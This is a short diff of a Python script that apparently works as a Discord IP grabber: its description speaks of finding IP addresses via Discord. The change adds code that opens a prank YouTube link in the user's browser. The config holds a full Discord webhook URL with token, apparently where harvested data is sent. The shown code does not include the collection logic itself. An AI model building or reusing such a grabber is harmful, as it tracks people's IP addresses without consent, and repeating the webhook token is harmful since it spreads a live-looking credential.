@@ -10,6 +10,9 @@ __description__ = "martivi aplikacia discordit ip dasadgena"
 __version__ = "v2.0"
 __author__ = "ALUBALIBALI"
 
+youtube_link = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
+webbrowser.open(youtube_link)
+
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1335558225692463124/N8UL3FVP12SJITgxLvkaBiqXm1ULRz-iXOBs7-PF91cL7Izdio7D7yjtdHNb7jJGiR-m",
